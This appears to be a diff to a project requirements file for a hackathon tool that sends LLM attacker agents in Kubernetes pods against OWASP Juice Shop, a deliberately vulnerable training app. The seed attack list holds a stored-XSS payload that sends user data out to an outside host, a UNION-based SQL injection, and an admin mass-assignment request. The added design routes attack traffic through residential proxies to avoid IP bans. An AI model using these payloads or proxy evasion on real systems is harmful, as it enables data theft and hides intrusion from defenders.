@@ -16,7 +16,7 @@
       "Target is now an external HTTP web app (OWASP Juice Shop, white-hat), not an in-cluster AI sandbox.",
       "Language is Go, not Python. The Python controller/attack scripts are reference material only and will be deleted in M6.",
       "Kubernetes cluster is the live DigitalOcean cluster (kubeconfig already configured), not Kind.",
-      "Attacker = PI agent (https://pi.dev/) running Gemma 4 via OpenRouter. Nimble.ai is used by the agent to navigate / scrape the target.",
+      "Attacker = PI agent (https://pi.dev/) running Gemma 4 via OpenRouter. Nimble.ai is used by the agent to crawl and proxy requests against the target.",
       "Datadog integration is DROPPED for v1 to keep the 1-day scope tight. PI + Nimble satisfy the >=2 sponsor tools criterion.",
       "Control plane is a local binary that talks to the remote cluster via the user's kubeconfig (NOT an in-cluster deployment)."
     ]
@@ -174,7 +174,7 @@
           "k8s/": "pod spawn, log stream, delete",
           "pi/": "PI agent invocation wrapper (used inside pod binary if any, OR pure helpers)",
           "openrouter/": "thin OpenRouter client (used by control plane for mutation, NOT by pods)",
-          "nimble/": "Nimble.ai client used by pods to navigate target",
+          "nimble/": "Nimble.ai client — crawl and proxy APIs used by pods to attack the target",
           "evolve/": "fitness scoring, mutation, generation orchestration",
           "spawn/": "high-level pod orchestrator: build manifest, launch, await, parse",
           "store/": "in-memory run state + JSON summary writer",
@@ -204,7 +204,7 @@
         "ARCHITECTURE.md": "1-pager (M5)"
       }
     },
-    "to_delete_in_M6": [
+    "to_delete_during_cleanup": [
       "backend/controller.py",
       "backend/attacks/__init__.py",
       "backend/attacks/*.py",
@@ -228,7 +228,7 @@
       "attacker-pod-image (Docker, runs PI+Gemma4+Nimble)",
       "k8s namespace + rbac (one-time setup)",
       "OpenRouter (LLM provider, used by both control-plane MUT step and inside attacker pod)",
-      "Nimble.ai (web automation, used inside attacker pod to navigate target)"
+      "Nimble.ai (crawl + proxy APIs, used inside attacker pod to attack the target)"
     ]
   },
 
@@ -273,8 +273,8 @@
       "purpose": "A disposable container that runs a single PI agent attempt against TARGET_URL with a given GENOME, then prints exactly one final JSON line to stdout.",
       "responsibilities": [
         "Start PI agent (per pi.dev docs).",
-        "Configure PI to use OpenRouter with model google/gemma-4-26b-a4b-it (or 31b-it).",
-        "Equip PI with the 'attacker' skill (in /home/agent/.pi/skills/attacker/) which has tools for: making HTTP requests, calling Nimble for browser-style navigation, parsing JSON, and reporting findings.",
+        "Configure PI to use OpenRouter with model google/gemma-4-31b-it (preferred) or google/gemma-4-26b-a4b-it (fallback if needed).",
+        "Equip PI with the 'attacker' skill (in /home/agent/.pi/skills/attacker/) which has tools for: making HTTP requests, calling Nimble's crawl and proxy APIs to interact with the target, parsing JSON, and reporting findings.",
         "System prompt: white-hat scope, target URL, attack vector hint (from GENOME), rules of engagement, output schema.",
         "On agent completion (or timeout), the entrypoint MUST emit exactly one final line to stdout matching the result schema (see data_contracts.attacker_result_jsonl).",
         "Exit 0 on a clean run regardless of breach/no-breach. Exit 2 on infrastructure error (missing key, network down)."
@@ -319,7 +319,7 @@
       "local_install_hint": "/home/carson/.pi/agent/models.json already exists with OpenRouter+Gemma 4 configured. Mirror that config inside the pod image.",
       "model_config_local_path": "/home/carson/.pi/agent/models.json",
       "model_ids_available": ["google/gemma-4-26b-a4b-it", "google/gemma-4-31b-it"],
-      "model_preferred": "google/gemma-4-26b-a4b-it",
+      "model_preferred": "google/gemma-4-31b-it",
       "skill_dir_inside_pod": "/home/agent/.pi/skills/attacker/",
       "ralph_must_research_before_use": true,
       "research_questions_for_ralph": [
@@ -339,22 +339,25 @@
       "budget_guardrail": "Hard cap of 32 OpenRouter calls per run. Track in a counter; abort MUT step and fall back to random when exceeded."
     },
     "nimble": {
-      "what": "REQUIRED sponsor tool. Web automation / scraping infrastructure used by the PI agent inside each pod to navigate the target site.",
-      "docs": "https://docs.nimbleway.com/llms.txt (ralph MUST WebFetch this on first M4 iteration before writing the Nimble client)",
+      "what": "REQUIRED sponsor tool. Nimble provides two APIs the agent uses to attack the target: (1) Crawl API — retrieves fully rendered page content including JS-heavy SPAs like Juice Shop; (2) Proxy API — routes the agent's attack HTTP requests through Nimble's residential/datacenter proxy network to avoid rate-limiting and IP bans during multi-generation runs.",
+      "docs": "https://docs.nimbleway.com/llms.txt (ralph MUST WebFetch this on first M6 iteration before writing the Nimble client)",
       "homepage": "https://nimbleway.com/",
       "auth_env": "NIMBLE_API_KEY",
       "primary_uses": [
-        "Fetch JS-rendered pages from the target (Juice Shop is an Angular SPA; static curl misses dynamic content).",
-        "Run authenticated session flows (login attempts, basket manipulation).",
-        "Optional CVE recon: query Nimble's web SDK for 'OWASP Juice Shop CVE' style searches to seed Gen-1 hints."
+        "Crawl API: retrieve the fully-rendered DOM of Juice Shop pages (it is an Angular SPA; raw curl returns a shell with no useful content). Use this to discover routes, tokens, and form structures the agent needs to craft attacks.",
+        "Proxy API: route the agent's attack requests (SQLi probes, XSS payloads, BOLA requests) through Nimble's proxy network so repeated probes are not blocked before a breach is confirmed.",
+        "Optional CVE recon: use the crawl API to fetch recent CVE pages from NVD or CISA to seed Gen-1 attack hints."
       ],
-      "client_package": "internal/nimble (Go package). Even though the live calls happen inside the pod, the control plane uses Nimble at startup to optionally fetch CVE seeds.",
+      "client_package": "internal/nimble (Go package). Exposes CrawlPage and ProxyRequest methods. Even though the live calls happen inside the pod, the control plane uses CrawlPage at startup to optionally fetch CVE seeds.",
       "ralph_must_research_before_use": true,
       "research_questions_for_ralph": [
-        "Exact endpoint URL(s) for Nimble's web/page fetch API.",
-        "Request/response schema (the .env.example contains NIMBLE_API_URL with a hex token, which is suspicious; resolve whether this is a key or a URL).",
-        "Rate limits and quotas.",
-        "How to surface Nimble responses as tool outputs to PI."
+        "What is the exact Nimble Crawl API endpoint URL and request schema (method, headers, body fields)?",
+        "What is the exact Nimble Proxy API endpoint URL and how are proxied requests specified (is it an HTTP CONNECT proxy or a request-wrapping API)?",
+        "How does auth work for each API — same NIMBLE_API_KEY Bearer header for both, or different schemes?",
+        "What does the response body look like for a successful crawl (field names for rendered HTML, status code, URL)?",
+        "Rate limits and quotas for both APIs.",
+        "The .env.example contains NIMBLE_API_URL with a hex-looking token — resolve whether this is a second key, a session token, or a legacy artifact to ignore.",
+        "How to surface crawl/proxy responses as tool outputs to PI (direct JSON passthrough, or wrap in a structured envelope)?"
       ]
     },
     "kubernetes": {
@@ -465,6 +468,70 @@
       "default_score": 0.0,
       "implementation_location": "backend/internal/evolve/fitness.go",
       "function_shape": "func Score(result Result) float64"
+    },
+    "nimble_test_schema": {
+      "philosophy": "Light but complete coverage of the four failure modes that can sink the demo: (1) missing key, (2) network error, (3) malformed response, (4) accidental key leak. Each test is small (10-30 lines) and uses httptest.NewServer to fake the Nimble endpoint. NO mocks of internal types. NO tests that just re-state what the function does.",
+      "test_file": "backend/internal/nimble/client_test.go",
+      "required_tests": [
+        {
+          "name": "TestCrawlPage_MissingKey",
+          "purpose": "Client constructed without NIMBLE_API_KEY must return a typed ErrMissingKey, NOT panic and NOT make any HTTP request.",
+          "shape": "Construct client with empty key; call CrawlPage; assert errors.Is(err, nimble.ErrMissingKey); assert no HTTP server was hit.",
+          "size_hint": "~15 lines"
+        },
+        {
+          "name": "TestCrawlPage_HappyPath",
+          "purpose": "Given a fake Nimble crawl server returning a valid response, the client parses it into the typed CrawlResult and the response contains the expected fields.",
+          "shape": "httptest.NewServer returns a canned JSON body matching the Nimble Crawl API response shape; call client.CrawlPage; assert rendered_html, status_code, and url fields populated; assert no error.",
+          "size_hint": "~25 lines"
+        },
+        {
+          "name": "TestCrawlPage_NetworkError",
+          "purpose": "When the Nimble crawl endpoint is unreachable, the client returns a wrapped error and does NOT panic.",
+          "shape": "Point client at a closed port (127.0.0.1:1); call CrawlPage with a short context deadline; assert err != nil; assert err contains 'nimble' for traceability.",
+          "size_hint": "~12 lines"
+        },
+        {
+          "name": "TestCrawlPage_MalformedResponse",
+          "purpose": "When Nimble crawl returns 200 with garbage JSON, the client returns a parse error rather than crashing or returning zero-value data silently.",
+          "shape": "httptest.NewServer returns 'not json at all {{{'; call CrawlPage; assert err != nil; assert err wraps a json.SyntaxError or equivalent.",
+          "size_hint": "~15 lines"
+        },
+        {
+          "name": "TestCrawlPage_HTTP5xx",
+          "purpose": "When Nimble crawl returns 500/502/503, the client returns a typed error containing the status code.",
+          "shape": "Table-driven over 500, 502, 503; httptest returns each; assert client returns ErrUpstream and the error stringifies the status code.",
+          "size_hint": "~20 lines"
+        },
+        {
+          "name": "TestProxyRequest_HappyPath",
+          "purpose": "Given a fake Nimble proxy endpoint, ProxyRequest routes the attack request through and returns the proxied response body and status.",
+          "shape": "httptest.NewServer returns a canned proxied response; call client.ProxyRequest with method=GET and a target URL; assert status and body pass through correctly.",
+          "size_hint": "~25 lines"
+        },
+        {
+          "name": "TestKeyNeverLogged",
+          "purpose": "The most critical test. Set NIMBLE_API_KEY to a known sentinel value ('test-sentinel-xyz123'). Run CrawlPage against a fake server that 500s (forcing the error path, which is the most likely place a careless dev logs the key). Assert the sentinel does NOT appear in any log output, error message, or returned struct.",
+          "shape": "Capture slog output to bytes.Buffer via slog.New(slog.NewTextHandler(buf,...)); inject buffer as test logger; force a 500 on CrawlPage; assert !strings.Contains(buf.String(), sentinel); assert !strings.Contains(err.Error(), sentinel). Repeat for ProxyRequest.",
+          "size_hint": "~35 lines",
+          "criticality": "HARD REQUIREMENT — this test passing is part of M6 acceptance criteria #3."
+        }
+      ],
+      "non_required_tests_to_skip": [
+        "Do NOT write a test that just checks 'Client struct is constructed with the right field'.",
+        "Do NOT write a test that mocks the Nimble service interface — the package itself IS the mockable seam.",
+        "Do NOT test the PI-side tool wrapper from Go. That wrapper is exercised by the M6 manual verify step (pod logs contain 'nimble_crawl' or 'nimble_proxy')."
+      ],
+      "smoke_test_outside_of_go_test": {
+        "name": "scripts/nimble-smoke.sh",
+        "purpose": "Optional 1-command live-call smoke test for use during demo prep. Reads NIMBLE_API_KEY from .env, calls the real Nimble Crawl API for the Juice Shop URL, prints the rendered HTML length and HTTP status. Exits 0 on success, 1 on any error. Not run by `go test`. Run manually before the demo.",
+        "shape": "#!/usr/bin/env bash; set -e; source .env; ./bin/openzerg debug nimble-crawl https://juice-shop-production-d0c5.up.railway.app",
+        "creation": "Optional in M6; recommended but not required for acceptance."
+      },
+      "test_helpers": {
+        "fake_server_helper": "Define a small newFakeNimbleServer(t, response) helper in client_test.go (NOT a separate testdata package). Returns *httptest.Server. Keep it under 20 lines.",
+        "no_global_state": "Each test must construct its own client and fake server. No package-level test setup. No t.Parallel() unless needed for speed."
+      }
     }
   },
 
@@ -492,12 +559,12 @@
       {"vector": "path_traversal_ftp", "category": "data_exposure", "technique": "dotdot", "target_path": "/ftp", "params": {"file": "../package.json.bak"}, "hint": "Try directory traversal in /ftp listing."},
       {"vector": "data_exposure_pkgjson", "category": "data_exposure", "technique": "direct_get", "target_path": "/ftp/package.json.bak", "params": {}, "hint": "Direct fetch of package.json backup."},
       {"vector": "data_exposure_robots", "category": "data_exposure", "technique": "direct_get", "target_path": "/robots.txt", "params": {}, "hint": "Read robots.txt for disallowed paths."},
-      {"vector": "admin_section", "category": "access_control", "technique": "force_browse", "target_path": "/#/administration", "params": {}, "hint": "Try to reach admin UI directly."},
+      {"vector": "admin_section", "category": "access_control", "technique": "force_browse", "target_path": "/#/administration", "params": {}, "hint": "Try to reach admin UI directly.", "requires_nimble": true},
       {"vector": "feedback_xss_stored", "category": "xss", "technique": "stored", "target_path": "/api/Feedbacks", "params": {"comment_payload": "<script>fetch('/api/Users').then(r=>r.text()).then(t=>fetch('//x/?d='+btoa(t)))</script>"}, "hint": "Try stored XSS in feedback comment field."},
       {"vector": "register_admin_role", "category": "auth", "technique": "param_pollution", "target_path": "/api/Users", "params": {"body": {"email": "z+<rand>@oz.dev", "password": "p", "role": "admin"}}, "hint": "Mass-assign role=admin during registration."},
       {"vector": "rest_products_search_sqli", "category": "injection", "technique": "error_based", "target_path": "/rest/products/search", "params": {"q_payload": "')) UNION SELECT name,id,price,description,image,deluxePrice,createdAt,updatedAt,deletedAt FROM Users--"}, "hint": "Classic Juice Shop search SQLi for user table leak."},
       {"vector": "captcha_bypass", "category": "validation", "technique": "skip_token", "target_path": "/api/Feedbacks", "params": {"omit_captcha": true}, "hint": "Submit feedback without captcha token."},
-      {"vector": "score_board", "category": "data_exposure", "technique": "force_browse", "target_path": "/#/score-board", "params": {}, "hint": "Find the hidden score-board route."}
+      {"vector": "score_board", "category": "data_exposure", "technique": "force_browse", "target_path": "/#/score-board", "params": {}, "hint": "Find the hidden score-board route.", "requires_nimble": true}
     ]
   },
 
@@ -600,27 +667,6 @@
     },
     {
       "id": "M4",
-      "name": "Nimble integration inside the attacker pod",
-      "goal": "The PI agent inside each pod can call Nimble to fetch a JS-rendered page from the target. At least one seed genome relies on Nimble (e.g., score_board route discovery via rendered DOM scrape).",
-      "tasks": [
-        "FIRST: WebFetch https://docs.nimbleway.com/llms.txt and follow links to identify the correct page-fetch endpoint, auth header, and response shape.",
-        "Implement backend/internal/nimble in Go (for control-plane CVE seeding) AND a parallel TS/Python tool wrapper inside the attacker image so PI can call it as a skill tool.",
-        "Update skills/attacker to expose a 'nimble_fetch' tool to PI, with a clear description telling the model when to use Nimble vs raw HTTP.",
-        "Update at least 2 seed genomes to require Nimble (e.g., score_board, admin_section).",
-        "Add control-plane startup hook: optional Nimble call for 'OWASP Juice Shop CVE 2025' which appends a 'hint' to one Gen-1 genome. Guarded by --enable-cve-seed flag (default off for demo determinism)."
-      ],
-      "verify": [
-        "Inspect a pod's logs: should show one or more 'nimble_fetch' tool calls with non-empty responses.",
-        "openzerg run --population 5 --generations 1 still completes and prints results."
-      ],
-      "acceptance": [
-        "Nimble is observably called in at least one pod per generation.",
-        "Nimble failures are non-fatal (pod still emits a result with fitness>=0).",
-        "Nimble client never leaks the API key into pod logs."
-      ]
-    },
-    {
-      "id": "M5",
       "name": "Evolution loop, fitness scoring, mutation, summary",
       "goal": "Full N-generation run with survivors, mutation, stop conditions, and the final summary.{json,md} artifacts.",
       "tasks": [
@@ -649,14 +695,14 @@
       ]
     },
     {
-      "id": "M6",
+      "id": "M5",
       "name": "Cleanup, docs, demo script",
       "goal": "Repository is clean (no Python, no abandoned HTML), has a usable README + DEMO.md, and a recorded successful run artifact lives in ./out/.",
       "tasks": [
-        "Delete files listed in repo_layout.to_delete_in_M6.",
+        "Delete files listed in repo_layout.to_delete_during_cleanup.",
         "Write README.md: tagline, one-paragraph what-it-does, run command, sample output snippet.",
         "Write docs/DEMO.md: 3-minute script aligned with judging criteria.",
-        "Write docs/ARCHITECTURE.md: 1-page diagram (from architecture.diagram_ascii) + the M3/M4 research notes from PI and Nimble docs.",
+        "Write docs/ARCHITECTURE.md: 1-page diagram (from architecture.diagram_ascii) + the M3 research notes from PI docs.",
         "Commit a sample ./out/summary-demo.json + .md from a successful run (sanitized of any real tokens)."
       ],
       "verify": [
@@ -669,6 +715,37 @@
         "No HTML/Phaser/Replay artifacts remain in repo.",
         "README + DEMO + ARCHITECTURE all exist and are non-empty.",
         "A sample summary artifact is committed."
+      ]
+    },
+    {
+      "id": "M6",
+      "name": "Nimble integration (sponsor tool — required)",
+      "goal": "The PI agent inside each pod can call Nimble to fetch JS-rendered pages from the target, and the control plane optionally uses Nimble at startup for CVE seeding. Nimble must be observably exercised during the demo run so the judging Tool-Use criterion is satisfied. Comes LAST because the rest of the system must already be green so any failure surface is isolated to the Nimble integration.",
+      "rationale": "M0-M5 deliver a working end-to-end attack swarm without Nimble (PI alone counts as one sponsor tool but we need a second). M6 layers Nimble on top so we can verify each piece in isolation. If Nimble is partially broken at demo time, M0-M5 still demo cleanly with --disable-nimble.",
+      "tasks": [
+        "Research first: WebFetch https://docs.nimbleway.com/llms.txt and any linked sub-pages. Resolve the questions under integrations.nimble.research_questions_for_ralph. Record findings in docs/ARCHITECTURE.md under a 'Nimble Integration' section.",
+        "Implement backend/internal/nimble: Go client with two methods: CrawlPage(ctx, targetURL, opts) for retrieving fully-rendered page content via Nimble's Crawl API, and ProxyRequest(ctx, method, targetURL, body, opts) for routing attack HTTP requests through Nimble's Proxy API. Use NIMBLE_API_KEY from env. Return typed responses, never raw bytes.",
+        "Add a thin tool wrapper inside the attacker pod image (backend/docker/pi-attacker/tools/nimble_tools) that PI can invoke as skill tools. Wrapper exposes two tools: nimble_crawl and nimble_proxy. Reads NIMBLE_API_KEY from env, calls the appropriate Nimble API, returns JSON to PI.",
+        "Update backend/docker/pi-attacker/skills/attacker/skill.yaml to expose both tools to PI: 'nimble_crawl: Use when you need the fully rendered DOM of a target page (Juice Shop is Angular — curl returns an empty shell). Returns rendered HTML and status code.' and 'nimble_proxy: Use when you want to route an attack request (SQLi probe, XSS payload, BOLA request) through Nimble\\'s proxy network to avoid IP-level blocking during repeated probes.'",
+        "Update at least 2 seed genomes in PRD.json's evolution_loop.seed_genomes_for_generation_1 to flag them as requiring Nimble (add a 'requires_nimble': true field). Recommended: score_board, admin_section. NOTE: editing PRD.json IS allowed in M6 — this is the one milestone that may modify the PRD.",
+        "Add a control-plane startup hook in cmd/openzerg/main.go: when --enable-cve-seed flag is set AND NIMBLE_API_KEY is present, call nimble.CrawlPage(ctx, 'https://nvd.nist.gov/vuln/search/results?query=juice+shop') and extract the top CVE snippet to append as a 'hint' on one Gen-1 genome. Default for the flag is FALSE for demo determinism; we enable it manually only if we want CVE-flavored demo footage.",
+        "Add a --disable-nimble flag to openzerg run for the failure-mode demo case (so the rest of the swarm still works if Nimble has a bad day at demo time). When set, the pod env does not include NIMBLE_API_KEY and the skill tool returns a stubbed 'nimble disabled' error to PI.",
+        "Write the Nimble test suite per data_contracts.nimble_test_schema (see below). Light but covers all four failure modes: missing key, network error, malformed response, key leak."
+      ],
+      "verify": [
+        "go test ./internal/nimble/...   # all schema tests green",
+        "go test ./...                   # full project still green",
+        "./bin/openzerg doctor           # reports 'NIMBLE_API_KEY: present' and 'nimble: reachable' (or 'demo' if no key)",
+        "./bin/openzerg run --target https://juice-shop-production-d0c5.up.railway.app --population 5 --generations 1   # at least one pod's log contains 'nimble_crawl' or 'nimble_proxy' tool call",
+        "./bin/openzerg run --target ... --disable-nimble --population 3 --generations 1   # completes cleanly with no nimble_crawl or nimble_proxy calls (proves the kill-switch works)"
+      ],
+      "acceptance": [
+        "At least one nimble_crawl or nimble_proxy tool call is observably logged per generation when Nimble is enabled.",
+        "Nimble failures are non-fatal: pod still emits a result with fitness >= 0 and the run continues.",
+        "Nimble client NEVER leaks NIMBLE_API_KEY into pod logs, control-plane logs, or summary artifacts. Verified by the key-leak test.",
+        "--disable-nimble produces a clean run with zero nimble_crawl or nimble_proxy calls (verified by absence of both tool names in pod logs).",
+        "docs/ARCHITECTURE.md has a 'Nimble Integration' section documenting the resolved Crawl API and Proxy API endpoint shapes.",
+        "summary.md from a Nimble-enabled run mentions which probes used nimble_crawl or nimble_proxy in their attack path (or notes 'no Nimble usage' if zero)."
       ]
     }
   ],
@@ -727,12 +804,12 @@
     ],
     "must_research_before_writing_code": [
       "Before M3: WebFetch https://pi.dev/docs and resolve all 'research_questions_for_ralph' under integrations.pi.",
-      "Before M4: WebFetch https://docs.nimbleway.com/llms.txt and resolve all 'research_questions_for_ralph' under integrations.nimble."
+      "Before M6: WebFetch https://docs.nimbleway.com/llms.txt and resolve all 'research_questions_for_ralph' under integrations.nimble."
     ],
     "escape_hatches": [
       "If PI has no usable Docker image, build from base ubuntu:24.04 and install PI CLI via its documented installer.",
       "If Nimble's API shape doesn't match assumptions, encode whatever IS in their docs and update the PRD via STATE.md (do NOT edit PRD.json silently; record deviations).",
-      "If Gemma 4 is too slow or rate-limited via OpenRouter, fall back to google/gemma-4-26b-a4b-it; if still bad, document and proceed with whatever works.",
+      "If Gemma 4 is too slow or rate-limited via OpenRouter, the 26b variant is available as fallback; if still bad, document and proceed with whatever works.",
       "If the DO image registry can't be pulled from the cluster, create an imagePullSecret via `doctl registry kubernetes-manifest` and add it to the pod spec."
     ]
   }
